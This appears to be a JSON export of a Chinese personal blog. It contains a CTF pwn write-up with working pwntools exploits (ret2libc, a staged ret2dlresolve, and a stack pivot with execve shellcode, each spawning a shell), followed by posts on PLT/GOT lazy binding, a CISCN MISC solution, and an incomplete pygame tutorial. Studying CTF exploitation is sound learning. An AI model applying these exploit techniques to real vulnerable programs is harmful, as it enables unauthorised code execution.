动态链接库中函数的偏移是固定的，所以我们可以通过泄露某个函数的偏移来确定程序使用的libc版本，从而获取system函数的的地址。我们一般常用的方法是采用 got 表泄露，即输出某个函数对应的 got 表项的内容。当然，由于 libc 的延迟绑定机制，我们需要泄漏已经执行过的函数的地址。（所谓延迟绑定，就是当函数第一次被调用的时候才进行绑定（包括符号查找、重定位等），如果函数从来没有用到过就不进行绑定。基于延迟绑定可以大大加快程序的启动速度，特别有利于一些引用了大量函数的程序）具体操作如下：\n\n泄露 __libc_start_main 地址\n\n获取 libc 版本\n\n获取 system 地址与 /bin/sh 的地址\n\n再次执行源程序\n\n触发栈溢出执行 system(‘/bin/sh’)\n分析\nEXP1234567891011121314151617from pwn import *from LibcSearcher import LibcSearchersh = process(&#x27;./ret2libc3&#x27;)ret2libc3 = ELF(&#x27;./ret2libc3&#x27;)puts_plt = ret2libc3.plt[&#x27;puts&#x27;]        # 获取程序中puts函数的plt地址libc_puts_got = ret2libc3.got[&#x27;puts&#x27;]          # 获取程序中puts函数的gotstart_addr = ret2libc3.symbols[&#x27;_start&#x27;]        # 获取程序中_start函数的地址payload1 = flat([&#x27;A&#x27; * 112, puts_plt,start_addr , libc_puts_got])        # 通过栈溢出让程序跳转到puts函数泄露出libc_puts_got地址再返回到start函数重新执行sh.sendlineafter(&#x27;Can you find it !?&#x27;, payload1)libc_puts_addr = u32(sh.recv()[0:4])         # 接收puts函数的地址libc = LibcSearcher(&#x27;puts&#x27;, libc_puts_addr)       # 确定程序使用的libclibcbase = libc_puts_addr - libc.dump(&#x27;puts&#x27;)       # 计算基地址system_addr = libcbase + libc.dump(&#x27;system&#x27;)         # 计算出system函数以及bin/sh字符串的地址binsh_addr = libcbase + libc.dump(&#x27;str_bin_sh&#x27;)payload2 = flat([&#x27;A&#x27; * 112, system_addr, &#x27;a&#x27;*4, binsh_addr])sh.sendline(payload2)sh.interactive()\n\n\n参考文章：https://ctf-wiki.org/pwn/linux/stackoverflow/basic-rop/#ret2syscall\nNO RELRO介绍这道题前先补充一些知识点：\ndl_runtime_resolve 函数在延迟绑定中说到dl_runtime_resolve 函数，只是说了这个函数会寻找程序第一次执行的函数但是并没有说原理，这次来补充一下。\n\ndl_runtime_resolve 需要两个参数，一个是 reloc_arg，就是函数自己的 plt 表项 push 的内容，一个是link_map，这个是公共 plt 表项 push 进栈的，通过它可以找到.dynamic的地址\n\n而 .dynamic 可以找到 .dynstr、.dynsym、.rel.plt 的这些东西的地址\n\n.dynstr 的地址是 .dynamic + 0x44 -&gt; 0x08048278\n.dynsym 的地址是 .dynamic + 0x4c -&gt; 0x080481d8\n\n\n.rel.plt 的地址是 .dynamic + 0x84 -&gt; 0x08048330\n\n\n.rel.plt 的地址加上 reloc_arg 可以得到函数重定位表项 Elf32_Rel 的指针，这个指针对应的里面放着 r_offset、r_info\n\n将 r_info&gt;&gt;8 得到的就是 .dynsym 的下标，这个下标的内容就是 name_offset\n\n.dynstr+name_offset 得到的就是 st_name，而 st_name 存放的就是要调用函数的函数名\n\n在动态链接库里面找这个函数的地址，赋值给 *rel-&gt;r_offset，也就是 GOT 表就完成了一次函数的动态链接\n\n\n\n栈迁移栈迁移作用是让程序跳转到我们构造好的栈中从而让程序按照我们的思路走下去。\n\n先用无用字符填满到rbp\n在将rbp跳转到我们想构造的栈帧位置\n再通过read向我们想构造的栈中写入数据\n最后通过leave_ret将esp指向栈帧，ebp指向栈底位置\n\n\n因为步骤有点多，所以就边写边改。\nstage1先将栈迁移到我们想构造的地方并在该地方写入我们想要写的数据\n12345678910111213141516171819202122232425262728293031323334353637from pwn import *elf = ELF(&#x27;main&#x27;)offset = 112read_plt = elf.plt[&#x27;read&#x27;]write_plt = elf.plt[&#x27;write&#x27;]ppp_ret = 0x08048619 # ROPgadget --binary main--only &quot;pop|ret&quot;，作用是将read的参数弹出恢复堆栈pop_ebp_ret = 0x0804861bleave_ret = 0x08048458 # ROPgadget --binary main --only &quot;leave|ret&quot;stack_size = 0x800bss_addr = 0x0804a040 # readelf -S main | grep &quot;.bss&quot;base_stage = bss_addr + stack_sizer = process(&#x27;./main&#x27;)r.recvuntil(&#x27;Welcome to XDCTF2015~!\\n&#x27;)# payload1payload = &#x27;A&#x27; * offsetpayload += p32(read_plt) # 读100个字节到base_stagepayload += p32(ppp_ret)payload += p32(0)payload += p32(base_stage)payload += p32(100)payload += p32(pop_ebp_ret) # 把base_stage pop到ebp中payload += p32(base_stage)payload += p32(leave_ret) # mov esp, ebp ; pop ebp ;将esp指向base_stager.sendline(payload1)# payload2cmd = &quot;/bin/sh&quot;payload2 = &#x27;AAAA&#x27; # 因为前面leave_ret以后esp会指向base_stage下一地址，所以这里用无用字符填充payload2 += p32(write_plt)payload2 += &#x27;AAAA&#x27;payload2 += p32(1)payload2 += p32(base_stage + 80)payload2 += p32(len(cmd))payload2 += &#x27;A&#x27; * (80 - len(payload2))payload2 += cmd + &#x27;\\x00&#x27;payload2 += &#x27;A&#x27; * (100 - len(payload2))r.sendline(payload2)r.interactive()\n\npayload里面的p32(read_plt)+p32(ppp_ret)+p32(0) +p32(base_stage) +p32(100)构造函数read(0,base_stage,100)作用是向我们伪造数据段的地方写入数据，也就是后面的payload2\nstage2接下来，用 dlresolve 的知识来调用 write 函数，利用 plt[0] 的相关指令，即公共 plt 表项 push linkmap 以及跳转到 dl_resolve 函数中解析的指令。此外，我们还得单独提供一个 write 重定位项在 plt 表中的偏移，即 write@plt push的那个参数。整个过程相当于调用dl_runtime_resolve 函数。\n1234567891011121314151617...cmd = &quot;/bin/sh&quot;plt_0 = 0x08048380 # objdump -d -j .plt mainindex_offset = 0x20 # write&#x27;s indexpayload2 = &#x27;AAAA&#x27;payload2 += p32(plt_0)payload2 += p32(index_offset)payload2 += &#x27;AAAA&#x27;payload2 += p32(1)payload2 += p32(base_stage + 80)payload2 += p32(len(cmd))payload2 += &#x27;A&#x27; * (80 - len(payload2))payload2 += cmd + &#x27;\\x00&#x27;payload2 += &#x27;A&#x27; * (100 - len(payload2))r.sendline(payload2)r.interactive()\n\n\npayload2 = p32(plt_0) + p32(index_offset)：利用dl_runtime_resolve 函数的原理找到write函数\nstage3同样控制 dl_resolve 函数中的 reloc_index 参数，不过这次控制其指向我们伪造的 write 重定位项\n1234567891011121314151617181920212223...cmd = &quot;/bin/sh&quot;plt_0 = 0x08048380 # objdump -d -j .plt mainrel_plt = 0x08048330 # objdump -s -j .rel.plt mainindex_offset = (base_stage + 28) - rel_plt # base_stage + 28指向fake_reloc，减去rel_plt即偏移write_got = elf.got[&#x27;write&#x27;]r_info = 0x607 # write: Elf32_Rel-&gt;r_infofake_reloc = p32(write_got) + p32(r_info)payload2 = &#x27;AAAA&#x27;payload2 += p32(plt_0)payload2 += p32(index_offset)payload2 += &#x27;AAAA&#x27;payload2 += p32(1)payload2 += p32(base_stage + 80)payload2 += p32(len(cmd))payload2 += &#x27;A&#x27; * (28 - len(payload2))payload2 += fake_reloc # (base_stage+28)的位置payload2 += &#x27;A&#x27; * (80 - len(payload2))payload2 += cmd + &#x27;\\x00&#x27;payload2 += &#x27;A&#x27; * (100 - len(payload2))r.sendline(payload2)r.interactive()\n\n\n红色区域是我们伪造的：\n\nstage4这一次构造fake_sym，使其指向我们控制的st_name。伪造.dynsym的地址fake_sym_addr，通过fake_sym_addr计算出伪造r_info。\n所以payload2运行过程如下：先跳转到公共plt[0]，plt[0]会跳转到地址.dynamic，.dynamic 可以找到.rel.plt ，.rel.plt 的地址加上伪造数据index_offset 可以得到函数重定位表项伪造 的fake_reloc指针，指针中r_info&gt;&gt;8作为.dynsym下标找到name_offset，name_offset加上.dynstr找到write函数名，最后找到对应函数地址\n123456789101112131415161718192021222324252627282930313233...cmd = &quot;/bin/sh&quot;plt_0 = 0x08048380rel_plt = 0x08048330index_offset = (base_stage + 28) - rel_pltwrite_got = elf.got[&#x27;write&#x27;]dynsym = 0x080481d8dynstr = 0x08048278fake_sym_addr = base_stage + 36align = 0x10 - ((fake_sym_addr - dynsym) &amp; 0xf) # 这里的对齐操作是因为dynsym里的Elf32_Sym结构体都是0x10字节大小fake_sym_addr = fake_sym_addr + alignindex_dynsym = (fake_sym_addr - dynsym) / 0x10 # 除以0x10因为Elf32_Sym结构体的大小为0x10，得到write的dynsym索引号r_info = (index_dynsym &lt;&lt; 8) | 0x7 # 计算 r_info,|7相当于加7,后面添加上07标识,表示这个是导入函数fake_reloc = p32(write_got) + p32(r_info)name_offset = 0x4c fake_sym = p32(name_offset) + p32(0) + p32(0) + p32(0x12)payload2 = &#x27;AAAA&#x27;payload2 += p32(plt_0)payload2 += p32(index_offset)payload2 += &#x27;AAAA&#x27;payload2 += p32(1)payload2 += p32(base_stage + 80)payload2 += p32(len(cmd))payload2 += &#x27;A&#x27; * (28 - len(payload2))payload2 += fake_reloc # (base_stage+28)的位置payload2 += &#x27;B&#x27; * alignpayload2 += fake_sym # (base_stage+36)的位置payload2 += &#x27;A&#x27; * (80 - len(payload2))payload2 += cmd + &#x27;\\x00&#x27;payload2 += &#x27;A&#x27; * (100 - len(payload2))r.sendline(payload2)r.interactive()\n\n\n12r_info = (index_dynsym &lt;&lt; 8) | 0x7 # 计算 r_info,|7相当于加7,后面添加上07标识,表示这个是导入函数fake_sym = p32(name_offset) + p32(0) + p32(0) + p32(0x12)  # name_offset=4c\n\n这两行代码就是模拟寻找name_offset。原来的流程是r_info&gt;&gt;8作为下标找到.dynsym对应的内容，而这两行代码也是一样，通过假的r_info&gt;&gt;8找到的地址就是我们已经构造的地方，因为由前面可以知道原来的流程是r_info&gt;&gt;8作为下标是6（原来的r_info=0x607），所以fake_sym伪造成第六行即可\n\n\nstage5把st_name指向输入的字符串&quot;write&quot;\n1234567891011121314151617181920212223242526272829303132cmd = &quot;/bin/sh&quot;plt_0 = 0x08048380rel_plt = 0x08048330index_offset = (base_stage + 28) - rel_pltwrite_got = elf.got[&#x27;write&#x27;]dynsym = 0x080481d8dynstr = 0x08048278fake_sym_addr = base_stage + 36align = 0x10 - ((fake_sym_addr - dynsym) &amp; 0xf)fake_sym_addr = fake_sym_addr + alignindex_dynsym = (fake_sym_addr - dynsym) / 0x10r_info = (index_dynsym &lt;&lt; 8) | 0x7fake_reloc = p32(write_got) + p32(r_info)st_name = (fake_sym_addr + 0x10) - dynstr # 加0x10因为Elf32_Sym的大小为0x10fake_sym = p32(st_name) + p32(0) + p32(0) + p32(0x12)payload2 = &#x27;AAAA&#x27;payload2 += p32(plt_0)payload2 += p32(index_offset)payload2 += &#x27;AAAA&#x27;payload2 += p32(1)payload2 += p32(base_stage + 80)payload2 += p32(len(cmd))payload2 += fake_reloc # (base_stage+28)的位置payload2 += &#x27;B&#x27; * alignpayload2 += fake_sym # (base_stage+36)的位置payload2 += &quot;write\\x00&quot;  # st_name对应的位置payload2 += &#x27;A&#x27; * (80 - len(payload2))payload2 += cmd + &#x27;\\x00&#x27;payload2 += &#x27;A&#x27; * (100 - len(payload2))r.sendline(payload2)r.interactive()\n\n\n\nstage6替换write为system，并修改system的参数\n1234567891011121314151617181920212223242526272829303132cmd = &quot;/bin/sh&quot;plt_0 = 0x08048380rel_plt = 0x08048330index_offset = (base_stage + 28) - rel_pltwrite_got = elf.got[&#x27;write&#x27;]dynsym = 0x080481d8dynstr = 0x08048278fake_sym_addr = base_stage + 36align = 0x10 - ((fake_sym_addr - dynsym) &amp; 0xf)fake_sym_addr = fake_sym_addr + alignindex_dynsym = (fake_sym_addr - dynsym) / 0x10r_info = (index_dynsym &lt;&lt; 8) | 0x7fake_reloc = p32(write_got) + p32(r_info)st_name = (fake_sym_addr + 0x10) - dynstrfake_sym = p32(st_name) + p32(0) + p32(0) + p32(0x12)payload2 = &#x27;AAAA&#x27;payload2 += p32(plt_0)payload2 += p32(index_offset)payload2 += &#x27;AAAA&#x27;payload2 += p32(base_stage + 80)payload2 += &#x27;aaaa&#x27;payload2 += &#x27;aaaa&#x27;payload2 += fake_reloc # (base_stage+28)的位置payload2 += &#x27;B&#x27; * alignpayload2 += fake_sym # (base_stage+36)的位置payload2 += &quot;system\\x00&quot;payload2 += &#x27;A&#x27; * (80 - len(payload2))payload2 += cmd + &#x27;\\x00&#x27;payload2 += &#x27;A&#x27; * (100 - len(payload2))r.sendline(payload2)r.interactive()\n\nEXP12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061from pwn import *elf = ELF(&#x27;main&#x27;)offset = 112read_plt = elf.plt[&#x27;read&#x27;]write_plt = elf.plt[&#x27;write&#x27;]ppp_ret = 0x08048619 # ROPgadget --binary main --only &quot;pop|ret&quot;pop_ebp_ret = 0x0804861bleave_ret = 0x08048458 # ROPgadget --binary main --only &quot;leave|ret&quot;stack_size = 0x800bss_addr = 0x0804a040 # readelf -Smain | grep &quot;.bss&quot;base_stage = bss_addr + stack_sizer = process(&#x27;./main&#x27;)r.recvuntil(&#x27;Welcome to XDCTF2015~!\\n&#x27;)payload = &#x27;A&#x27; * offsetpayload += p32(read_plt)payload += p32(ppp_ret)payload += p32(0)payload += p32(base_stage)payload += p32(100)payload += p32(pop_ebp_ret)payload += p32(base_stage)payload += p32(leave_ret)r.sendline(payload)cmd = &quot;/bin/sh&quot;plt_0 = 0x08048380 # objdump -d -j .plt mainrel_plt = 0x08048330 # objdump -s -j .rel.plt mainindex_offset = (base_stage + 28) - rel_plt # base_stage + 28指向fake_reloc，减去rel_plt即偏移write_got = elf.got[&#x27;write&#x27;]dynsym = 0x080481d8dynstr = 0x08048278fake_sym_addr = base_stage + 36align = 0x10 - ((fake_sym_addr - dynsym) &amp; 0xf)fake_sym_addr = fake_sym_addr + alignindex_dynsym = (fake_sym_addr - dynsym) / 0x10r_info = (index_dynsym &lt;&lt; 8) | 0x7fake_reloc = p32(write_got) + p32(r_info)st_name = (fake_sym_addr + 16) - dynstrfake_sym = p32(st_name) + p32(0) + p32(0) + p32(0x12)payload2 = &#x27;AAAA&#x27;payload2 += p32(plt_0)payload2 += p32(index_offset)payload2 += &#x27;AAAA&#x27;payload2 += p32(base_stage + 80)payload2 += &#x27;aaaa&#x27;payload2 += &#x27;aaaa&#x27;payload2 += fake_reloc # (base_stage+28)的位置payload2 += &#x27;B&#x27; * alignpayload2 += fake_sym # (base_stage+36)的位置payload2 += &quot;system\\x00&quot;payload2 += &#x27;A&#x27; * (80 - len(payload2))payload2 += cmd + &#x27;\\x00&#x27;payload2 += &#x27;A&#x27; * (100 - len(payload2))r.sendline(payload2)r.interactive()\n\nX-CTF Quals 2016 - b0verfl0w还是栈溢出，不过这次除了libc泄露还可以采取stack pivoting，就是劫持栈指针指向攻击者所能控制的内存处，然后再在相应的位置进行 ROP。\n\n没有开堆栈不可执行，所以可以采取stack pivoting，将ROP写入在栈中，控制eip执行堆栈中的ROP。\n\n查找gadgets，发现存在jmp esp，所以可以让eip执行堆栈中的内容。\n编写shellcode\n12shellcode_x86 = &quot;\\x31\\xc9\\xf7\\xe1\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0\\x0b\\xcd\\x80&quot;sub_esp_jmp = asm(&#x27;sub esp, 0x28;jmp esp&#x27;)\n\n计算偏移。fgets只允许读取50个字节，s总共能存储0x20个字节，也就是溢出50-0x20-4=14字节\n\n最后编写exp\nEXP123456789101112from pwn import *sh = process(&#x27;./b0verfl0w&#x27;)shellcode_x86 = &quot;\\x31\\xc9\\xf7\\xe1\\x51\\x68\\x2f\\x2f\\x73&quot;shellcode_x86 += &quot;\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0&quot;shellcode_x86 += &quot;\\x0b\\xcd\\x80&quot;jmp_esp = 0x08048504sub_esp_jmp = asm(&#x27;sub esp, 0x28;jmp esp&#x27;)payload = shellcode_x86+&#x27;a&#x27;*(0x20-len(shellcode_x86))+&#x27;a&#x27;*4+p32(jmp_esp)+sub_esp_jmpsh.sendline(payload)sh.interactive()\n\n","slug":"ROP-x86","date":"2021-10-05T10:23:30.000Z","categories_index":"学习记录","tags_index":"pwn","author_index":"Krito"},{"id":"a4072082096b626cb339c7cf12b546b7","title":"延迟绑定","content":"程序运行时，printf的地址就会被存储到data段，call   c &lt;hello+0xc&gt;就会跳转到call printf_stub\n123printf_stub:\tmov rax,[printf函数地址]\tjmp rax\n\n\n\n程序在编译的时候会采用两种表进行辅助，即plt表和got表。\n\nplt表为（Procedure Link Table），是Linux ELF文件中用于延迟绑定的表，即函数第一次被调用的时候才进行绑定\ngot表为（Global Offset Table），是Linux ELF文件中用于定位全局变量和函数的一个表。\n\n延迟绑定程序在执行前，如果对整个动态链接库函数进行符号解析的话，是非常浪费资源的，因为一个程序不可能调用动态链接库中所有的函数。我们最好能做到只对用到的函数进行函数解析，这样可以大大提高文件链接的效率，加快程序的启动速度。\n为提高CPU的利用效率，动态链接器默认采用延迟链接方式，动态链接器不会在程序加载时解析每一个函数，而是在调用时通过plt和got来对函数进行解析，然后会将解析获得函数地址存放在got中，下一次调用时会直接使用got中的函数地址对函数进行调用。\n第一次调用第一次调用某个函数时，会经历以下过程:\nxxx@plt -&gt; xxx@got -&gt; xxx@plt -&gt; 公共@plt -&gt; _dl_runtime_resolve -&gt; 函数地址\n第一次调用时，由于延迟绑定，所以got表里面并没有函数的真正地址，此时got表存储的是函数的plt表下一命令地址。但是在plt跳转到got时还会将某个数压入栈中，这个数可以看出这个函数的ID，之后进入到公共@plt跳转执行_dl_runtime_resolve函数，这个函数的作用是根据函数ID来寻找对应函数，并改变got表地址为函数真正地址。\n\n第二次调用因为第一次调用已经将got表和函数进行绑定，所以调用某个函数时的流程就变成如下：\nxxx@plt -&gt; xxx@got -&gt; 函数地址\n调试以下面代码为例进行调试\n12345678910#include&lt;stdio.h&gt;void hello()&#123;\tprintf(&quot;Hello World&quot;);&#125;int main()&#123;\thello();\treturn 0;&#125;\n\n使用命令编译查看： \n\ngcc -Wall -g -o try.o -c try.c -m32                \nobjdump -d try.o\n\n\n程序运行时，printf的地址就会被存储到data段，call   c &lt;hello+0xc&gt;就会变成call printf_stub，printf_stub就会跳转到data段中printf地址，最后跳转到printf函数。printf_stub就相当于printf的plt表，data段中存储printf地址就相当于printf的got表。\n\n","slug":"plt、got和延迟绑定","date":"2021-10-01T02:26:57.000Z","categories_index":"心得","tags_index":"pwn","author_index":"Krito"},{"id":"dde0577c288faf648c0d6f90bbb39dc6","title":"CISCN复现","content":"前言初次参加这种大型比赛，给我的感觉就是题目出的挺不错（一题都没做出来），但是这个比赛形式着实令人不解。不仅如此，在写完选择题后系统崩溃也是我没想得到（虽然没有停滞很久，但是感觉很意外，毕竟是国赛）。\nMISC隔空传话附件是一个txt文件，里面全是十六进制码，根据题目搜索发现是PDU编码解码，解码发现前面四行得到有用的信息：flag前面一部分是15030442和w465。而后面则是一堆十六进制码，但是发现在第一行十六进制码的开头几个十六进制码正好是png十六进制文件头，猜测这些应该是png图片的十六进制码，利用脚本将其导出：\n1234567891011121314151617181920212223242526272829303132333435363738394041from selenium import webdriver# 打开读取data.txt文件with open(&#x27;../data.txt&#x27;, &#x27;r&#x27;) as f:    data = f.read()data = data.splitlines()[4:]  # 前四条不是十六进制# 启动谷歌browser = webdriver.Chrome()url = &quot;http://www.sendsms.cn/pdu/&quot;browser.get(url)output = &#x27;&#x27;  # 用于接收结果for i in data:    browser.find_element_by_name(&quot;smsText2&quot;).clear()  # 清空转换框里面的内容    browser.find_element_by_name(&quot;smsText2&quot;).send_keys(i)  # 输入要翻译的内容    browser.find_element_by_xpath(&quot;//input[@name=&#x27;checkButton&#x27;]&quot;).click()  # 点击翻译    recv = browser.find_element_by_name(&quot;smsOut&quot;).get_attribute(&#x27;value&#x27;)  # 获取翻译内容    recv = recv.split()  # 将获得内容按空格分开    n = 0    txt = &#x27;&#x27;    for j in recv:  # 读取需要的信息        if n == 3:  # 获取时间戳            txt += j        if n == 13:            txt += j  # 获取十六进制码            txt += &#x27;\\n&#x27;  # 分行        n += 1    output += txtbrowser.quit()  # 退出浏览器output = output.splitlines()result = &#x27;&#x27;time = []data = []for i in output:  # 按时间戳进行排序    time.append(int(i[3:5]) * 60 + int(i[6:8]) - 1800)    data.append(i[8:])for i in range(0, 1200):    for j in range(len(data)):        if i == time[j]:            result += data[j]with open(&#x27;output.txt&#x27;, &#x27;w&#x27;) as f:  # 将结果保存到out.txt文件中    f.write(result)\n\n之后导出图片，发现图片乱七八糟，想到之前w465应该是width465转成十六进制码就是1D1，得到图片\n\n结合前面得到flag：CISCN{15030442_b586_4c9e_b436_26def12293e4}\n","slug":"CISCN复现","date":"2021-05-18T11:25:16.000Z","categories_index":"MISC","tags_index":"wp","author_index":"Krito"},{"id":"7ceb9bfebefe73ecc89b8753e3a43190","title":"pygame使用","content":"\n\n\n\n\n\n\n\n\n了解，学习一个第三方模块，最好是去官网学习，因为官方有第一手资料，而在其他人手里则是第二手，使用要学好还是得去官网。在这里我就直接拿实例讲pygame\n安装pygame (windows)1python -m pip install -U pygame --user\n\n可能的报错：\n\n输入python可能会报错，改成python3\n无法下载，检查网络是否正常，确认无误还是无法下载，查看是否使用了梯子，如果使用就关闭。\n\n设计思路设计一个游戏必须先有思路，这里我引用了一个大佬的图片，基本思路差不多，接下来就根据这个思路开始设计这个游戏\n\n首先，在设计时要明确游戏有哪些元素，从而创建对应的类。在飞机大战中，要创建以下几个类：\n\n用于管理游戏资源和行为的类（我是将它放在alien_invasion.py文件中，作为游戏的入口）\n\n存储游戏设置的类（settings.py）\n\n存储飞机的类（ship.py）\n\n存储子弹的类（bullet.py）\n\n存储敌机的类（Alien.py）\n\n存储游戏初始数据的类（game_stats.py）\n\n存储得分的类（scoreboard.py）\n\n存储初始游戏界面的类（bottom.py）\nalien_invasion.py首先要初始化要显示的窗口或屏幕\n12345678910111213141516import sysimport pygameclass AlienInvasion:    def __init__(self):                                    pygame.init()                                                                                   #pygame.init()安全地初始化了所有导入的pygame模块        self.screen = pygame.display.set_mode((1200,800))         #初始屏幕，1200是屏幕宽度，800是屏幕高度        pygame.display.set_caption(&quot;Alien Invasion&quot;)                      #在屏幕边框上面添加游戏名Alien Invasion    def run_game(self):                                                                         #游戏主循环，让游戏不断持续下去        while True:            for event in pygame.event.get():                if event.type == pygame.QUIT:                                          # 如果用户输入q游戏就结束                    sys.exit()            pygame.display.flip()if __name__ == &#x27;__main__&#x27;:      ai = AlienInvasion()    ai.run_game()\n\n相关代码解释：\n**if __ name __ == ‘ __ main ： ‘**： name __ 是当前模块名，当模块被直接运行时模块名为 __ main __ 。这句话的意思就是，当模块被直接运行时，以下代码块将被运行，当模块是被导入时，代码块不被运行。（如果还是有疑惑查看链接）\nfor event in pygame.event.get()：Pygame会接受用户的各种操作（比如按键盘，移动鼠标等）产生事件，事件随时可能发生，而且量也可能会很大，Pygame的做法是把一系列的事件存放一个队列里，逐个的处理。这行代码就是将事件逐一读取。\nsettings.py存储游戏元素属性\n123456789101112131415161718192021222324252627282930class Settings:    def __init__(self):        self.screen_width = 1200                 #屏幕宽度        self.screen_height = 600                 #屏幕高度        self.bg_color = (230, 230, 230)      #背景颜色        self.ship_speed = 1.5              \t        #飞船移动速度        self.bullet_speed = 1.5          \t     #子弹速度        self.bullet_width = 3            \t      #子弹宽度        self.bullet_height = 15           \t      #子弹长度        self.bullet_color = (60,60,60)        #子弹颜色        self.bullet_allowed = 5           \t     #子弹数量        self.alien_speed = 1.0            \t     #外星人移动速度        self.fleet_drop_speed = 10           #外星人设置        self.fleet_direction = 1          \t     #1是右移，-1是左移动        self.ship_limit = 3                           #设置生命次数        self.speedup_scale = 1.1               #游戏运行的速度        self.score_scale = 1.5                    #根据游戏速度提高外星人的分数    def initialize_dynamic_settings(self):                              #初始化在整个游戏中更改的设置        self.ship_speed = 1.5                                                         #飞船移动速度        self.bullet_speed = 3.0                                                     #子弹移动速度        self.alien_speed = 1.0                                                       #外星人移动速度        self.fleet_direction = 1                                                       #外星人移动方向        self.alien_points = 50                                                         #每个外星人的分数    def increase_speed(self):                                                                       #提高速度设置和外星人分数        self.ship_speed *= self.speedup_scale        self.bullet_speed *= self.speedup_scale        self.alien_speed *= self.speedup_scale        self.alien_points = int(self.alien_points * self.score_scale)\n\n\n\nship.py\n\n1234567891011121314151617181920212223import pygameclass Plane:    def __init__(self,ai_game):        # 初始化小飞机并设置其初始位置        self.screen = ai_game.screen                                                              #加载图像，并获得其矩形区域        self.settings = ai_game.settings                                                         #读取设置里面的信息        self.img_plane = pygame.image.load(&quot;images/ship.bmp&quot;)          #加载飞船照片        self.screen_rect = ai_game.screen.get_rect()                              #得到飞船的的矩形区域        self.screen_rect = self.screen.get_rect()                                        #得到screen的矩形区域        self.rect.midbottom = self.screen_rect.midbottom                      # 将飞船放到底部中央        self.x = float(self.rect.x)                                                                        #存储飞机的位置    def blitme(self):        # 在指定位置绘制小飞机        self.screen.blit(self.image, self.rect)    def update(self):                                                                                                       #根据运动标记更新飞船的位置        if self.moving_right and self.rect.right &lt; self.screen_rect.right:            #如果飞船向右移动没有超过边界，飞船就向右移动x（x大小根据设置里面的飞船速度）            self.x += self.settings.ship_speed        if self.moving_left and self.rect.left &gt; 0:                                                        #如果飞船向左移动没有超过边界，飞船就向左移动x             self.x -= self.settings.ship_speed             self.rect.x = self.x                                                                                             #更新飞船位置    def center_ship(self):                                                                                 #将飞船居中        self.rect.midbottom = self.screen_rect.midbottom                       #定义飞船居中位置为屏幕下面底部中央        self.x = float(self.rect.x)                                                                         #更新飞船位置\n\nbullet.py123456789101112131415161718import pygamefrom pygame.sprite import Spriteclass Bullet(Sprite):    def __init__(self, ai_game):                                                                   #在舰船的当前位置创建一个子弹对象        super().__init__()                                                                                   #继承        self.screen = ai_game.screen        self.settings = ai_game.settings        self.color = self.settings.bullet_color        self.rect = pygame.Rect(0, 0, self.settings.bullet_width,self.settings.bullet_height)              #创建一个子弹并放置在正确位置        self.rect.midtop = ai_game.ship.rect.midtop        self.y = float(self.rect.y)                                                                          #存储子弹的位置    def update(self):                                                                                            #更新子弹位置        self.y -= self.settings.bullet_speed        self.rect.y = self.y    def draw_bullet(self):                                                                                   #在屏幕上绘制子弹        pygame.draw.rect(self.screen, self.color, self.rect)\n\ngame_stats.py1234567891011121314class GameStats:    &quot;&quot;&quot;Track statistics for Alien Invasion.&quot;&quot;&quot;        def __init__(self, ai_game):        &quot;&quot;&quot;Initialize statistics.&quot;&quot;&quot;        self.settings = ai_game.settings        self.reset_stats()        self.game_active = False                                           #自动开启游戏        self.high_score = 0\t\t\t\t\t\t       #高分永远不要重置。            def reset_stats(self):\t\t\t\t\t\t    #初始化游戏数据        self.ships_left = self.settings.ship_limit        self.score = 0        self.level = 1\n\nscoreboard.py12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667import pygame.fontfrom pygame.sprite import Groupfrom ship import Shipclass Scoreboard:    def __init__(self, ai_game):                       #初始化得分属性        self.ai_game = ai_game        self.screen = ai_game.screen        self.screen_rect = self.screen.get_rect()        self.settings = ai_game.settings                self.stats = ai_game.stats                                      #得分信息的字体设置        self.text_color = (30, 30, 30)        self.font = pygame.font.SysFont(None, 48)        self.prep_score()                                                       #初始乐谱图像        self.prep_high_score()        self.prep_level()        self.prep_ships()    def prep_score(self):        &quot;&quot;&quot;Turn the score into a rendered image.&quot;&quot;&quot;        rounded_score = round(self.stats.score, -1)        score_str = &quot;&#123;:,&#125;&quot;.format(rounded_score)        self.score_image = self.font.render(score_str, True,                self.text_color, self.settings.bg_color)                self.score_rect = self.score_image.get_rect()               #在屏幕右上方显示分数        self.score_rect.right = self.screen_rect.right - 20        self.score_rect.top = 20    def prep_high_score(self):                                                     #将高分转换为图像        high_score = round(self.stats.high_score, -1)        high_score_str = &quot;&#123;:,&#125;&quot;.format(high_score)        self.high_score_image = self.font.render(high_score_str, True,                self.text_color, self.settings.bg_color)                    self.high_score_rect = self.high_score_image.get_rect()          #将高分居中显示在屏幕顶部        self.high_score_rect.centerx = self.screen_rect.centerx        self.high_score_rect.top = self.score_rect.top    def prep_level(self):                                                                      #将等级转换为渲染的图像。        level_str = str(self.stats.level)        self.level_image = self.font.render(level_str, True,                self.text_color, self.settings.bg_color)            self.level_rect = self.level_image.get_rect()                 #将级别定位在分数下方        self.level_rect.right = self.score_rect.right        self.level_rect.top = self.score_rect.bottom + 10    def prep_ships(self):                                                                 #显示生命值        self.ships = Group()        for ship_number in range(self.stats.ships_left):            ship = Ship(self.ai_game)            ship.rect.x = 10 + ship_number * ship.rect.width            ship.rect.y = 10            self.ships.add(ship)    def check_high_score(self):                                               #检查是否有新高分        if self.stats.score &gt; self.stats.high_score:            self.stats.high_score = self.stats.score            self.prep_high_score()    def show_score(self):                                                            #在屏幕上面绘制分数和其它信息        self.screen.blit(self.score_image, self.score_rect)        self.screen.blit(self.high_score_image, self.high_score_rect)        self.screen.blit(self.level_image, self.level_rect)        self.ships.draw(self.screen)\n\nbotto.py123456789101112131415161718192021222324252627import pygame.font class Button:     def __init__(self, ai_game, msg):                 #初始化        self.screen = ai_game.screen        self.screen_rect = self.screen.get_rect()                self.width, self.height = 200, 50               #设置按钮的尺寸和属性        self.button_color = (0, 255, 0)        self.text_color = (255, 255, 255)        self.font = pygame.font.SysFont(None, 48)                self.rect = pygame.Rect(0, 0, self.width, self.height)    #放置play图标        self.rect.center = self.screen_rect.center                self._prep_msg(msg)                                  #该按钮仅需准备一次    def _prep_msg(self, msg):                              #将其转换为渲染的图像，然后在按钮上居中显示文本。        self.msg_image = self.font.render(msg, True, self.text_color,                self.button_color)        self.msg_image_rect = self.msg_image.get_rect()        self.msg_image_rect.center = self.rect.center    def draw_button(self):                                     #在屏幕上面绘制        